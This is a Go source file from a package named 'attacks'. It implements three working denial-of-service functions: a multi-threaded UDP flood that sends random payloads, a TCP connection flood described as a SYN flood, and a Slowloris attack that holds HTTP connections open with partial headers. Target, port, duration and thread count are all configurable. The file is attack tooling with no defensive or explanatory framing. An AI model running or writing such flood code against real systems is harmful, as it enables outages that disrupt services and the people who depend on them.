package attacks

import (
	"context"
	"fmt"
	"math/rand"
	"net"
	"sync"
	"time"
)

// UDPFlood performs a basic UDP flood attack.
// It uses standard net.Dial, which does not spoof the source IP but is portable and doesn't require root.
func UDPFlood(ctx context.Context, target string, port int, duration int, threads int) {
	fmt.Printf("Starting UDP Flood on %s:%d for %d seconds with %d threads.\n", target, port, duration, threads)

	// Resolve the target address
	udpAddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", target, port))
	if err != nil {
		fmt.Printf("Error resolving target address: %v\n", err)
		return
	}

	var wg sync.WaitGroup
	ctx, cancel := context.WithTimeout(ctx, time.Duration(duration)*time.Second)
	defer cancel()

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			// Each goroutine gets its own connection
			conn, err := net.DialUDP("udp", nil, udpAddr)
			if err != nil {
				fmt.Printf("Error creating UDP connection: %v\n", err)
				return
			}
			defer conn.Close()

			// Create a buffer of random bytes to send as payload
			payload := make([]byte, 1024)
			rand.Read(payload)

			for {
				select {
				case <-ctx.Done():
					// Time's up or manually stopped
					return
				default:
					// Send the payload
					_, err := conn.Write(payload)
					if err != nil {
						// Don't print errors here to avoid flooding the console
						// In a real scenario, you might log this to a file or a metric system
						time.Sleep(time.Second) // Sleep to avoid tight loop on continuous errors
						continue
					}
					// Small sleep to prevent overwhelming the local CPU/network interface completely
					time.Sleep(time.Millisecond)
				}
			}
		}()
	}

	wg.Wait()
	fmt.Println("UDP Flood attack finished.")
}

// TCPFlood performs a TCP flood attack.
// For a "SYN" flood, it repeatedly attempts to establish a TCP connection.
func TCPFlood(ctx context.Context, target string, port int, duration int, threads int, method string) {
	fmt.Printf("Starting TCP Flood (%s) on %s:%d for %d seconds with %d threads.\n", method, target, port, duration, threads)

	address := fmt.Sprintf("%s:%d", target, port)

	var wg sync.WaitGroup
	ctx, cancel := context.WithTimeout(ctx, time.Duration(duration)*time.Second)
	defer cancel()

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					// Each connection attempt sends a SYN packet.
					// We don't need to complete the handshake.
					conn, err := net.DialTimeout("tcp", address, 2*time.Second)
					if err == nil {
						// If connection succeeds, close it immediately and move on.
						conn.Close()
					}
					// A small pause between connection attempts per goroutine
					time.Sleep(10 * time.Millisecond)
				}
			}
		}()
	}

	wg.Wait()
	fmt.Printf("TCP Flood (%s) attack finished.\n", method)
}

// SlowLorisAttack performs a Slowloris attack.
// It opens many connections and keeps them alive by sending partial data.
func SlowLorisAttack(ctx context.Context, target string, port int, duration int, threads int) {
	fmt.Printf("Starting SlowLoris attack on %s:%d for %d seconds with %d sockets.\n", target, port, duration, threads)

	address := fmt.Sprintf("%s:%d", target, port)
	var wg sync.WaitGroup
	ctx, cancel := context.WithTimeout(ctx, time.Duration(duration)*time.Second)
	defer cancel()

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			conn, err := net.Dial("tcp", address)
			if err != nil {
				// Could not connect, just exit this goroutine
				return
			}
			defer conn.Close()

			// Send initial partial HTTP request
			headers := fmt.Sprintf("GET /?%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\n", rand.Intn(1000), target)
			_, err = conn.Write([]byte(headers))
			if err != nil {
				return
			}

			// Keep the connection alive
			for {
				select {
				case <-ctx.Done():
					return
				default:
					_, err := conn.Write([]byte(fmt.Sprintf("X-a: %d\r\n", rand.Intn(100))))
					if err != nil {
						// Connection likely closed by server, exit
						return
					}
					// Send keep-alive header every 10 seconds
					time.Sleep(10 * time.Second)
				}
			}
		}()
		// Stagger the connection attempts
		time.Sleep(50 * time.Millisecond)
	}

	wg.Wait()
	fmt.Printf("SlowLoris attack finished.\n")
}
